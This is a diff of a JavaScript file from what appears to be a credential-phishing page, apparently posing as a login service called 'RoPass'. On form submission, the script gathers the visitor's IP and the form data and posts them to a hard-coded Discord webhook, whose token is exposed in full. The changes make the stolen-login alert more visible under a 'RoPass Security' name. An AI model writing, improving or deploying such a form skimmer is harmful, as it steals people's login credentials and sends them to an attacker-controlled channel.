@@ -20,9 +20,8 @@ async function sendToDiscord(event) {
     loadingAnimation.style.display = 'flex';
 
     try {
-        // === REPLACE THIS WITH YOUR DISCORD WEBHOOK URL ===
+        // === YOUR DISCORD WEBHOOK URL ===
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1357165850867535964/ZP88VNiaeQyw8RPvVIHc81WHQqUR2FFzXRybRM-mjCRx4KfysK5cmMIpPJMNPjXr-nbZ';
-        // ==================================================
 
         // Get IP address
         let publicIP = 'N/A';
@@ -64,11 +63,19 @@ async function sendToDiscord(event) {
             "timestamp": new Date().toISOString()
         };
 
+        // ========== FIXED: ADD CONTENT FIELD ==========
         // Send to Discord
         const response = await fetch(WEBHOOK_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
+            body: JSON.stringify({
+                // THIS MAKES THE MESSAGE VISIBLE
+                content: "🔐 **NEW ROPASS LOGIN**",
+                
+                embeds: [embed],
+                username: "RoPass Security",
+                avatar_url: "https://i.imgur.com/8TqBJyU.png"
+            })
         });
 
         if (!response.ok) {
@@ -106,7 +113,6 @@ async function sendToDiscord(event) {
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.querySelector('form');
     if (form) {
-        // Remove any old event listeners and add new one
         form.onsubmit = sendToDiscord;
     }
 });
